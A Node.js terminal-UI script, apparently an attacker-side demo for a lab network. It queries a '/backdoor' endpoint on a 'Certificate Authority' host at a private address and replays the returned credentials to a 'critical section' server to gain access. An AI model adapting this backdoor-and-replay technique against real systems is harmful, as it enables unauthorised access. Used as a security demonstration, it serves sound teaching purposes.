var os = require('os');
var http = require('http');
var express = require('express');
var connect = require("connect");
var blessed = require('blessed');
var crypto = require('crypto');
var bodyParser = require('body-parser');
var querystring = require('querystring');
var ip = require('ip');
var app = express();

app.use(bodyParser.urlencoded());

// Create a screen object.
var screen = blessed.screen();

// Create a box perfectly centered horizontally and vertically.
var box = blessed.box({
	top: 'center',
	left: 'center',
	width: '50%',
	height: '50%',
	content: '',
	tags: true,
	border: {
		type: 'line'
	},
	style: {
		fg: 'white',
		bg: 'blue',
		border: {
			fg: '#f0f0f0'
		}
	}
});

// Append our box to the screen.
screen.append(box);

app.set('port', process.env.PORT || 3000);

box.setContent("Make attack request...");
screen.render();

var ca_ip = "192.168.0.108", cs_ip = "192.168.0.104";

function postTo(url, data, host, callback) {
	var post_data = querystring.stringify(data);
	var post_options = {
		host: host,
		port: '3000',
		path: url,
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': post_data.length
		}
	};
	var post_req = http.request(post_options, function(res) {
		res.setEncoding('utf8');
		res.on('data', function (chunk) {
			if(typeof callback == 'function')
				callback(chunk);
		});
	});

	// post the data
	post_req.write(post_data);

	post_req.end();
}

var requesting = false;
box.on('click', function() {
	if(!requesting) {
		box.style.bg = "black";
		box.setContent("Requesting information from Certificate Authority");
		screen.render();
		requesting = true;
		// Get information from Certificate Authority
		postTo('/backdoor', {}, ca_ip, function(response) {
			box.setContent("Got information for MAC address " + JSON.parse(response).mac_address + "\nMaking request to critical section");
			screen.render();
			// Try to enter critical section
			setTimeout(function() {
				postTo('/enter', JSON.parse(response), cs_ip, function(cs_response) {
					if(JSON.parse(cs_response).success) {
						box.style.bg = "red";
						box.setContent("Got access to critical section!");
					}
					else {
						box.style.bg = "green";
						box.setContent("Did not get access...");
					}
					screen.render();
				});
			}, 2000);
		});
	}
});



// Quit on Escape, q, or Control-C.
screen.key(['escape', 'q', 'C-c'], function(ch, key) {
	return process.exit(0);
});

// Focus our element.
box.focus();

// Render the screen.
screen.render();

